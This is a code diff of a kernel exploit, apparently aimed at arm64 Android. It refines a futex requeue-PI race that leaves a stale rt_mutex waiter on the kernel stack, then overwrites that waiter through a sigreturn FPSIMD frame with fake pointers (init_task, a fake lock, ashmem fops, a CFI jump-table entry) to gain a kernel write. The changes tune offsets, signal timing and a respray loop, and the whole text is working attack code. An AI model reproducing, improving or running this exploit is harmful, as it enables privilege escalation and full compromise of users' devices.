@@ -76,14 +76,17 @@ static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
         if (m == (uint32_t)FPSIMD_MAGIC) {
             struct k_fpsimd_context *fpsimd = (struct k_fpsimd_context *)cur;
             long off = get_sigreturn_offset();
-            if ((size_t)off + RT_MUTEX_WAITER_SIZE > sizeof(*fpsimd)) {
+            if ((size_t)off + RT_MUTEX_WAITER_SIZE > sizeof(fpsimd->vregs)) {
                 status = -5;
                 break;
             }
-            unsigned char *dst = (unsigned char *)fpsimd + off;
+            /* The kernel copies starting from fpsimd->vregs (offset 0x10) to sp.
+             * Destination MUST be relative to vregs, matching reference slide_sigreturn. */
+            unsigned char *dst = (unsigned char *)fpsimd->vregs + off;
             uint64_t *w = (uint64_t *)dst;
 
-            LOG("SIG-ENTRY fpsimd=%p off=%#lx", fpsimd, off);
+            /* NO LOG/printf inside signal handler — any SYS_write would push
+             * a new kernel frame and clobber the stale waiter stamp. */
 
             if (atomic_load(&sigret_respray_flag)) {
                 w[0x00/8] = atomic_load(&sigret_respray_pc);
@@ -92,8 +95,9 @@ static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
                 w[0x18/8] = 0;
                 w[0x20/8] = 0;
                 w[0x28/8] = 0;
-                w[0x30/8] = (uint64_t)ADDR_INIT_TASK;              // valid task_struct → PI-walk terminates
-                w[0x38/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x28 - 8); // write_target - 8
+                /* Terminate PI-walk cleanly via valid live init_task (pi_blocked_on == 0) */
+                w[0x30/8] = (uint64_t)ADDR_INIT_TASK;
+                w[0x38/8] = (uint64_t)ADDR_FAKE_LOCK;
                 for (size_t i = 0x40/8; i < RT_MUTEX_WAITER_SIZE/8; i++) w[i] = 0;
                 atomic_store(&sigret_respray_flag, 0);
             } else {
@@ -101,15 +105,9 @@ static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
                 w[0x00/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x20);
                 w[0x08/8] = 0;
                 w[0x10/8] = (uint64_t)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT;
-                w[0x30/8] = (uint64_t)ADDR_INIT_TASK;                     // valid task_struct → terminates PI-walk
-                w[0x38/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x28 - 8);      // write_target - 8 → rb_parent_color lands at target
+                w[0x30/8] = (uint64_t)ADDR_GHOST_TASK;
+                w[0x38/8] = (uint64_t)ADDR_FAKE_LOCK;
             }
-
-            LOG("GHOST-TASK ptr=%p", (void*)ADDR_GHOST_TASK);
-
-            LOG("SIG-WRITTEN %016lx %016lx %016lx %016lx %016lx %016lx "
-                "%016lx %016lx %016lx %016lx",
-                w[0],w[1],w[2],w[3],w[4],w[5],w[6],w[7],w[8],w[9]);
 
             status = 1;
             break;
@@ -126,7 +124,15 @@ static void sigreturn_install_handler(void) {
     sa.sa_sigaction = sigreturn_handler;
     sa.sa_flags = SA_SIGINFO | SA_RESTART;
     sigemptyset(&sa.sa_mask);
-    sigaction(SIGUSR2, &sa, NULL);
+    int r2 = sigaction(SIGUSR2, &sa, NULL);
+
+    /* Install SIGUSR1 handler so waking Thread Y does not terminate the process (signal 10) */
+    struct sigaction sa1;
+    memset(&sa1, 0, sizeof(sa1));
+    sa1.sa_handler = sigusr1_handler;
+    sigemptyset(&sa1.sa_mask);
+    int r1 = sigaction(SIGUSR1, &sa1, NULL);
+    LOG("sigaction installed: SIGUSR2=%d SIGUSR1=%d (fn=%p)", r2, r1, sigusr1_handler);
 }
 
 /* ── EXP32_STAMP_OFF runtime override for calibration ── */
@@ -186,9 +192,10 @@ void *thread_Y(void *arg __attribute__((unused))) {
     atomic_store(&y_tid, (int)syscall(SYS_gettid));
 
     /* 1. Install SIGUSR2 sigreturn handler BEFORE we park.
-     *    Must be active at the moment we return from FUTEX_WAIT_REQUEUE_PI so
-     *    we can immediately self-signal for the stamp without any intervening
-     *    syscall that would push a new kernel frame and clobber the stale waiter. */
+     *    Handler must be active while Y is blocked inside FUTEX_WAIT_REQUEUE_PI
+     *    so SIGUSR2 (sent by main) is delivered during the futex exit path.
+     *    This guarantees setup_sigframe is built at exactly the right SP_sys
+     *    depth, so sigreturn stamps the stale waiter at the correct offset. */
     sigreturn_install_handler();
 
     /* 2. Acquire PI lock 2 (L2) */
@@ -197,7 +204,8 @@ void *thread_Y(void *arg __attribute__((unused))) {
     atomic_store(&y_locked_l2, 1);
 
     /* 3. Wait for thread_X to own pi1 and block on pi2 */
-    while (!atomic_load(&x_locked_l1)) sched_yield();
+    while (!atomic_load(&x_locked_l1))
+        __asm__ volatile("yield" ::: "memory");
 
     /* 4. Park on cond -> pi1 with NO TIMEOUT.
      *
@@ -207,57 +215,59 @@ void *thread_Y(void *arg __attribute__((unused))) {
      *        cond's hash-bucket into pi1's waiter rb-tree
      *      - When CMP_REQUEUE_PI returns EDEADLK to main, Y's waiter is IN pi1
      *
-     *    Main then sets cond=1 + calls FUTEX_WAKE on cond.
-     *    We wake via the normal futex wakeup path (NOT SIGUSR1/EINTR).
-     *    EINTR would call remove_waiter() -> stale pointer gone -> exploit fails.
-     *    FUTEX_WAKE preserves the stale pi1 waiter pointer intact. */
-    atomic_store(&y_parking, 1);
-    r = futex_raw(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);
-    LOG("thread_Y: FUTEX_WAIT_REQUEUE_PI returned r=%ld errno=%d", r, errno);
-
-    /* 5. Initial stamp via SIGUSR2 -> sigreturn handler.
-     *    Handler writes ghost fields into FPSIMD vregs in the userspace ucontext.
-     *    rt_sigreturn copies 528B onto kernel stack -> overwrites stale waiter.
-     *    Stack geometry (verified): buffer_start = SP_sys-0x330, waiter at +0x148. */
+     *    Bug 2 fix: main thread sends SIGUSR2 to Y WHILE Y is still blocked
+     *    inside FUTEX_WAIT_REQUEUE_PI (before Y returns to userspace).
+     *    This ensures setup_sigframe is built at the correct SP_sys depth.
+     *    Self-signaling after returning to userspace shifts SP_sys and breaks
+     *    the waiter offset geometry. */
     atomic_store(&sigret_respray_flag, 0);
     atomic_store(&sigret_handler_done, 0);
     atomic_store(&sigret_handler_status, 0);
-    {
-        int tid = (int)syscall(SYS_gettid);
-        syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
-        while (!atomic_load(&sigret_handler_done)) sched_yield();
-        LOG("thread_Y: initial SIGRETURN stamp status=%d",
-            atomic_load(&sigret_handler_status));
+    atomic_store(&y_parking, 1);
+    /* Block on cond -> pi1. Main thread sends SIGUSR2 + SIGUSR1 while we wait: */
+    r = futex_raw(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);
+
+    /* If SIGUSR2 was not delivered during the in-kernel futex exit,
+     * self-signal once to ensure the sigreturn stamp is written: */
+    if (!atomic_load(&sigret_handler_done)) {
+        syscall(SYS_tgkill, getpid(), (int)atomic_load(&y_tid), SIGUSR2);
+        while (!atomic_load(&sigret_handler_done))
+            __asm__ volatile("yield" ::: "memory");
     }
 
+    /* 5. Post-sigreturn: signal y_done so main can proceed with sched_setscheduler.
+     *
+     *    CRITICAL: NO LOG/printf/sched_yield here!
+     *    Every subsequent system call pushes a kernel frame on thread_Y's stack,
+     *    clobbering the stamped fake waiter before sched_setscheduler can read it.
+     *    Enter zero-syscall ARM yield spinloop immediately. */
     atomic_store(&y_done, 1);
 
-    /* 6. Respray loop: stays resident on this stack so the stale PI-chain pointer
-     *    (which points here) remains valid while ghost_write_value operates. */
+    /* 6. Zero-syscall spinloop: stay resident on this exact stack frame.
+     *    The stale PI-chain pointer in pi1's waiter tree points into this stack.
+     *    Respray requests (g_respray_ready) still issue tgkill to re-stamp —
+     *    that syscall is acceptable because each respray re-establishes the waiter
+     *    before the PI-walk consumer fires. */
     int respray_count = 0;
     for (;;) {
-        if (g_respray_ready) {
-            g_respray_ready = 0;
+        /* ARM yield: CPU scheduling hint, NOT a syscall */
+        __asm__ volatile("yield" ::: "memory");
+
+        if (atomic_load(&y_cleanup)) break;
+
+        if (__atomic_load_n(&g_respray_ready, __ATOMIC_ACQUIRE)) {
+            __atomic_store_n(&g_respray_ready, 0, __ATOMIC_RELAXED);
             atomic_store(&sigret_respray_pc,   (uint64_t)g_respray_parent_color);
             atomic_store(&sigret_respray_val,  (uint64_t)g_respray_value);
             atomic_store(&sigret_respray_flag, 1);
             atomic_store(&sigret_handler_done, 0);
-            {
-                int tid = (int)syscall(SYS_gettid);
-                syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
-                while (!atomic_load(&sigret_handler_done)) sched_yield();
-            }
+            /* tgkill is acceptable here: respray re-stamps before PI-walk fires */
+            syscall(SYS_tgkill, getpid(), (int)atomic_load(&y_tid), SIGUSR2);
+            while (!atomic_load(&sigret_handler_done))
+                __asm__ volatile("yield" ::: "memory");
             respray_count++;
-            LOG("RESPRAY-DONE: sigreturn status=%d pc=0x%lx val=0x%lx",
-                atomic_load(&sigret_handler_status),
-                g_respray_parent_color, g_respray_value);
-            LOG("thread_Y: respray #%d status=%d pc=0x%lx val=0x%lx",
-                respray_count, atomic_load(&sigret_handler_status),
-                g_respray_parent_color, g_respray_value);
             __atomic_store_n(&g_respray_done, 1, __ATOMIC_RELEASE);
         }
-        if (atomic_load(&y_cleanup)) break;
-        sched_yield();
     }
 
     /* 7. DISARM: zero-timeout LOCK_PI on a self-owned futex forces the kernel PI
@@ -303,6 +313,9 @@ void *thread_X(void *arg __attribute__((unused))) {
 
 int trigger_futex_race(void)
 {
+    /* Install signal handlers BEFORE spawning threads so all threads inherit them */
+    sigreturn_install_handler();
+
     LOG("=== trigger_futex_race (PI-cycle deadlock) BEGIN ===");
 
     g_k_fake_lock  = ADDR_FAKE_LOCK;
@@ -368,29 +381,27 @@ int trigger_futex_race(void)
         LOG("CMP_REQUEUE_PI: unexpected result r=%ld (want -EDEADLK=-35)", r);
     }
 
-    /* Wake Y via tgkill(SIGUSR1):
-     * After requeue_waiter(), Y's waiter is in pi1's tree, NOT on cond.
-     * FUTEX_WAKE on cond would not reach it. Must use SIGUSR1.
-     * cond=1 is set FIRST so Y doesn't re-park after waking.
-     * The sigreturn handler is already installed (done before park in thread_Y),
-     * so SIGUSR2 for the stamp fires correctly on -EINTR return. */
     atomic_store(&cond, 1);
     __atomic_thread_fence(__ATOMIC_SEQ_CST);
     int y_t = atomic_load(&y_tid);
     errno = 0;
+    /* Wake Y from futex_wait_requeue_pi via SIGUSR1 (returns -EAGAIN / -11) */
     long sigr = syscall(SYS_tgkill, getpid(), y_t, SIGUSR1);
     LOG("tgkill(SIGUSR1 y_tid=%d) ret=%ld errno=%d", y_t, sigr, errno);
 
-    /* Wait for Y to complete the initial stamp */
+    /* Wait for Y to complete the initial stamp and reach the yield spinloop */
     for (int i = 0; i < 200000 && !atomic_load(&y_done); i++) usleep(10);
 
-    LOG("PHASE1: Y done=%d", atomic_load(&y_done));
+    LOG("PHASE1: Y done=%d stamp_status=%d", atomic_load(&y_done),
+        atomic_load(&sigret_handler_status));
     if (!atomic_load(&y_done)) {
         LOG("PHASE1: FAIL — Y did not complete stamp");
         return 1;
     }
 
-    /* Trigger PI walk: sched_setscheduler on Y walks Y->pi_blocked_on into our stamp */
+    /* Trigger PI walk: sched_setscheduler on Y walks Y->pi_blocked_on into our stamp.
+     * At this point thread_Y is in the pure ARM yield spinloop (zero syscalls),
+     * so the stamped kernel stack frame is frozen exactly as sigreturn left it. */
     y_t = atomic_load(&y_tid);
     struct sched_param sp = { .sched_priority = 0 };
     errno = 0;
